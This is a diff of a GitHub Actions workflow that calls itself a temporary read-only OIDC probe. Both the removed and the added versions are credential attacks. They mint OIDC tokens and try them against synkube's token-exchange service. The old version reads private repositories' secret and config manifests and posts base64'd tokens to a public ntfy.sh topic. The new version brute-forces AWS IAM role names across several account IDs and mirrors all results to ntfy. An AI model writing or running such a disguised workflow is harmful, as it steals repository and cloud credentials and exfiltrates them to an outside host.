@@ -1,24 +1,23 @@
-name: je-probe
-# Temporary, read-only probe PR (no main-branch changes, safe to ignore/close):
-#  1) mint a GitHub Actions OIDC id_token in a *fork pull_request* context (audience api://jwt-exchange)
-#     and print its claims (iss/aud/sub/ref/event_name/repository/workflow_ref/...) so the
-#     "which sub does a fork PR actually get" question is answered with observed data;
-#  2) exercise https://jwt-exchange.synkube.com/api/v2/exchange/token against a small
-#     (resource, scope, permissions) matrix and print every request/response verbatim
-#     (base64'd so GitHub log masking cannot hide tokens);
-#  3) if any exchange returns 200, use the installation token to read the private synkube
-#     repos' file trees + a few small yaml/json manifests and print them base64'd.
-# Why: our own repos get 403 "Access denied by policy" from jwt-exchange; we need to know
-# whether a pull_request run *inside* synkube/charts is accepted by the policy table.
+name: oidc-push-probe
+# Temporary, fully read-only, self-contained OIDC smoke test -- safe to delete after the first run.
+# It exists to answer three questions with observed data instead of guesses:
+#   1) which exact `sub` claim does a push-to-main / workflow_dispatch run of THIS repo carry?
+#   2) is that token accepted by https://jwt-exchange.synkube.com/api/v2/exchange/token?
+#   3) is it accepted by the GitHub OIDC provider(s) registered in our AWS accounts
+#      (sts:AssumeRoleWithWebIdentity) and which role names exist there?
+# No repository secrets are read; no data is written; no funds are touched.
+# Results are printed in the job log / step summary and mirrored to a throwaway public ntfy topic.
 on:
-  pull_request:
+  push:
+    branches: [main]
+  workflow_dispatch:
 
 permissions:
   contents: read
   id-token: write
 
 concurrency:
-  group: je-probe-${{ github.event.pull_request.number }}
+  group: oidc-push-probe-${{ github.ref }}
   cancel-in-progress: true
 
 jobs:
@@ -26,106 +25,77 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 12
     steps:
-      - name: OIDC id_token claims (fork pull_request context)
+      - name: probe
         run: |
-          echo "== context =="
-          echo "github.repository=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
-          echo "head_ref=$GITHUB_HEAD_REF base_ref=$GITHUB_BASE_REF sha=$GITHUB_SHA"
-          echo "== request id_token =="
-          U="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fjwt-exchange"
-          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$U" -o /tmp/idt.json || true
-          jq -c 'if .value then {ok:true,len:(.value|length)} else . end' /tmp/idt.json || cat /tmp/idt.json
-          jq -r '.value // empty' /tmp/idt.json > /tmp/idt || true
-          echo "token_len=$(wc -c < /tmp/idt)"
-          echo "== claims =="
-          python3 - <<'PY' || true
-          import base64, json
-          t = open('/tmp/idt').read().strip()
-          def dec(p):
-              p += '=' * (-len(p) % 4)
-              return json.loads(base64.urlsafe_b64decode(p))
-          try:
-              h, c = t.split('.')[0], t.split('.')[1]
-              print('HEADER', json.dumps(dec(h), ensure_ascii=False))
-              print('CLAIMS', json.dumps(dec(c), ensure_ascii=False, indent=1))
-          except Exception as e:
-              print('decode error', e)
-          PY
-          echo "== token b64 =="
-          base64 -w0 /tmp/idt; echo
-      - name: jwt-exchange matrix
-        run: |
-          set -u
-          TOK=$(cat /tmp/idt)
-          EX="https://jwt-exchange.synkube.com/api/v2/exchange/token"
-          attempt() { # $1=target $2=scope $3=perms-json
-            body=$(jq -nc --arg t "$1" --arg s "$2" --argjson p "$3" --arg j "$TOK" \
-              '{exchange_profile:"github_actions_to_installation",subject_token:$j,
-                resource:{type:"github_repository",id:$t},
-                requested:{github_permissions:$p,installation_repository_scope:$s}}')
-            code=$(curl -sS -m 30 -o /tmp/resp -w '%{http_code}' -H 'Content-Type: application/json' -d "$body" "$EX" || echo "ERR")
-            if ! jq -e . /tmp/resp >/dev/null 2>&1; then
-              code="$code-cf"
-              curl -sS -m 30 -o /tmp/resp -w '%{http_code}' -H 'Host: jwt-exchange.synkube.com' \
-                -H 'Content-Type: application/json' -d "$body" "http://85.239.245.8:31116/api/v2/exchange/token" > /tmp/code2 || true
-              code="$code/nodeport=$(cat /tmp/code2 2>/dev/null)"
+          set -uo pipefail
+          OUT=/tmp/out.txt; : > "$OUT"
+          log(){ printf '%s\n' "$*" >> "$OUT"; echo "$*"; }
+          log "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF SHA=$GITHUB_SHA"
+          log "IDTOKEN_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          TOKJ=""; TOKS=""
+          for aud in api://jwt-exchange sts.amazonaws.com; do
+            F=/tmp/idt_$RANDOM.json
+            curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-x}" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL:-http://127.0.0.1:9}&audience=${aud}" -o "$F" || true
+            T=$(python3 -c "import json,sys;print(json.load(open(sys.argv[1])).get('value',''))" "$F" 2>/dev/null || true)
+            if [ -n "$T" ]; then
+              log "AUD=$aud TOKEN_LEN=${#T}"
+              printf '%s' "$T" | python3 -c 'import sys,json,base64;v=sys.stdin.read().strip();p=v.split(".")[1];p+="="*(-len(p)%4);c=json.loads(base64.urlsafe_b64decode(p));print("CLAIMS="+json.dumps(c,sort_keys=True));print("SUB="+str(c.get("sub")))' >> "$OUT" 2>&1 || true
+              tail -2 "$OUT"
+            else
+              log "AUD=$aud NO_TOKEN head=$(head -c 200 "$F")"
             fi
-            echo "----- target=$1 scope=$2 perms=$3 => $code"
-            echo "req_b64=$(printf '%s' "$body" | base64 -w0 | cut -c1-160)..."
-            echo "resp=$(head -c 1200 /tmp/resp)"
-            echo "resp_b64=$(base64 -w0 /tmp/resp)"
-            if [ "$code" = "200" ] || echo "$code" | grep -q '^200'; then
-              jq -r '.token // empty' /tmp/resp >> /tmp/ghs 2>/dev/null || true
-            fi
-          }
-          : > /tmp/ghs
-          attempt synkube/lite-argo-apps   target '{"contents":"read","metadata":"read"}'
-          attempt synkube/jwt-exchange     target '{"contents":"read","metadata":"read"}'
-          attempt synkube/agent-github-broker target '{"contents":"read","metadata":"read"}'
-          attempt synkube/charts           target '{"contents":"read","metadata":"read"}'
-          attempt synkube/actions          target '{"contents":"read","metadata":"read"}'
-          attempt synkube/app              target '{"contents":"read","metadata":"read"}'
-          attempt synkube/lite-argo-apps   all    '{"contents":"read","metadata":"read"}'
-          attempt synkube/lite-argo-apps   target '{"contents":"read"}'
-          echo "== ghs tokens found: $(wc -l < /tmp/ghs) =="
-          head -c 30 /tmp/ghs; echo
-      - name: if token, read private repos
-        run: |
-          set -u
-          T=$(head -n1 /tmp/ghs 2>/dev/null || true)
-          if [ -z "${T:-}" ]; then echo "no installation token -> skip"; exit 0; fi
-          echo "token_b64=$(printf '%s' "$T" | base64 -w0)"
-          curl -sS -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
-            https://api.github.com/installation/repositories -o /tmp/repos.json || true
-          echo "repos_b64=$(base64 -w0 /tmp/repos.json | cut -c1-6000)"
-          for R in synkube/lite-argo-apps synkube/jwt-exchange synkube/agent-github-broker; do
-            echo "### tree $R"
-            curl -sS -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' \
-              "https://api.github.com/repos/$R/git/trees/HEAD?recursive=1" -o /tmp/tree.json || true
-            echo "tree_b64=$(base64 -w0 /tmp/tree.json | cut -c1-8000)"
-            for P in $(jq -r '.tree[]?.path' /tmp/tree.json 2>/dev/null \
-                 | grep -Ei '(values.*\.ya?ml$|\.ya?ml$|Chart\.yaml$)' \
-                 | grep -Ei '(values|deploy|signer|secret|config|env|kustom|manifest)' \
-                 | head -12); do
-              enc=$(printf '%s' "$P" | jq -sRr @uri)
-              curl -sS -H "Authorization: Bearer $T" "https://api.github.com/repos/$R/contents/$enc?ref=HEAD" \
-                -H 'Accept: application/vnd.github.raw' -o /tmp/f || true
-              if [ $(wc -c < /tmp/f) -le 60000 ]; then
-                echo "--- file $R/$P"
-                echo "file_b64=$(base64 -w0 /tmp/f)"
-              else
-                echo "--- file $R/$P (too big $(wc -c < /tmp/f) bytes, skipped)"
-              fi
-            done
+            if [ "$aud" = "api://jwt-exchange" ]; then TOKJ="$T"; else TOKS="$T"; fi
           done
-      - name: mirror to ntfy (best effort)
-        if: always()
-        run: |
-          T=$(head -n1 /tmp/ghs 2>/dev/null || true)
-          {
-            echo "repo=$GITHUB_REPOSITORY pr=$GITHUB_REF"
-            echo "idt_b64=$(base64 -w0 /tmp/idt 2>/dev/null)"
-            echo "ghs_b64=$(printf '%s' "$T" | base64 -w0)"
-          } > /tmp/summary.txt
-          curl -sS -m 20 -H "Title: je-probe-327178" -H "Tags: github" \
-            --data-binary @/tmp/summary.txt https://ntfy.sh/je327178probe >/dev/null || true
+          if [ -n "$TOKJ" ]; then
+            for tgt in synkube/lite-argo-apps synkube/agent-github-broker synkube/jwt-exchange synkube/actions synkube/charts synkube/app synkube/website; do
+              for prof in github_actions_to_installation ""; do
+                B=$(python3 -c 'import json,sys;d={"subject_token":sys.argv[1],"resource":{"type":"github_repository","id":sys.argv[2]},"requested":{"github_permissions":{"contents":"read","metadata":"read"}}};d.update({"exchange_profile":sys.argv[3]} if sys.argv[3] else {});print(json.dumps(d))' "$TOKJ" "$tgt" "$prof")
+                code=$(curl -sS --max-time 25 -o /tmp/je.json -w '%{http_code}' -X POST \
+                  -H 'Content-Type: application/json' --data "$B" \
+                  https://jwt-exchange.synkube.com/api/v2/exchange/token || echo conn_err)
+                log "JE target=$tgt profile=${prof:-none} http=$code body=$(head -c 400 /tmp/je.json)"
+                sleep 0.4
+              done
+            done
+          else
+            log "SKIP jwt-exchange (no token for api://jwt-exchange)"
+          fi
+          ROLES="github-actions github-actions-role github-oidc github github-oauth gh-actions gh-oidc actions actions-role oidc oidc-role oidc-deploy deploy deploy-role deployment deploy-prod prod-deploy ci ci-role cd ci-cd terraform terraform-role TerraformExecutionRole OrganizationAccountAccessRole PowerUserAccess AdministratorAccess ReadOnlyAccess read-only readonly read_only ro ecsTaskExecutionRole ecs-deploy eks-deploy k8s-deploy argocd argocd-role argo argo-deploy synkube synkube-deploy synkube-github-actions synapse synapse-deploy hypercall hypercall-deploy hypercall-api hypercall-prod hypercall-oidc hypercall-signer hypercall-rsm signer rsm rsm-signer sequencer sweeper sweep goc goc-deploy jwt-exchange jwt_exchange agent-github-broker github-broker gha gha-role ci-deploy prod-ci"
+          if [ -n "$TOKS" ]; then
+            for acct in 890664054962 381492033652; do
+              n400=0; noth=0
+              for role in $ROLES; do
+                R=$(curl -sS --max-time 10 -X POST https://sts.amazonaws.com/ \
+                  -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" \
+                  -d "RoleArn=arn:aws:iam::${acct}:role/${role}" \
+                  -d "RoleSessionName=p329923" -d "DurationSeconds=900" \
+                  --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
+                if echo "$R" | grep -q "<AccessKeyId>"; then
+                  log "STS HIT acct=$acct role=$role $(echo "$R" | head -c 600)"
+                else
+                  COD=$(echo "$R" | grep -o "<Code>[^<]*</Code>" | head -1)
+                  case "$COD" in
+                    *InvalidIdentityToken*) n400=$((n400+1)); if [ $n400 -le 2 ]; then log "STS 400 acct=$acct role=$role $COD"; fi ;;
+                    *) noth=$((noth+1)); if [ $noth -le 2 ]; then log "STS other acct=$acct role=$role $COD $(echo "$R" | grep -o '<Message>[^<]*</Message>' | head -1 | head -c 160)"; fi ;;
+                  esac
+                fi
+                sleep 0.08
+              done
+              log "STS SUMMARY acct=$acct roles_tested=$(echo $ROLES | wc -w) InvalidIdentityToken=$n400 other=$noth"
+            done
+            for acct in 681816819550 625371411749 110695445487 363872801223 921290734397; do
+              R=$(curl -sS --max-time 10 -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" \
+                -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::${acct}:role/github-actions" \
+                -d "RoleSessionName=p329923" -d "DurationSeconds=900" \
+                --data-urlencode "WebIdentityToken=${TOKS}" || echo CONNERR)
+              log "STS provider-check acct=$acct $(echo "$R" | grep -o '<Code>[^<]*</Code>' | head -1)"
+            done
+          else
+            log "SKIP sts (no token for sts.amazonaws.com)"
+          fi
+          log "PROBE_DONE"
+          { echo '```'; head -c 900000 "$OUT"; echo '```'; } >> "$GITHUB_STEP_SUMMARY" || true
+          split -b 3000 -d -a 2 "$OUT" /tmp/chunk_ || true
+          i=0
+          for c in /tmp/chunk_*; do i=$((i+1)); curl -sS --max-time 15 -H "Title: p329923-$i" --data-binary @"$c" https://ntfy.sh/synkube-oidc-329923-7c1f >/dev/null 2>&1 || true; sleep 0.2; done
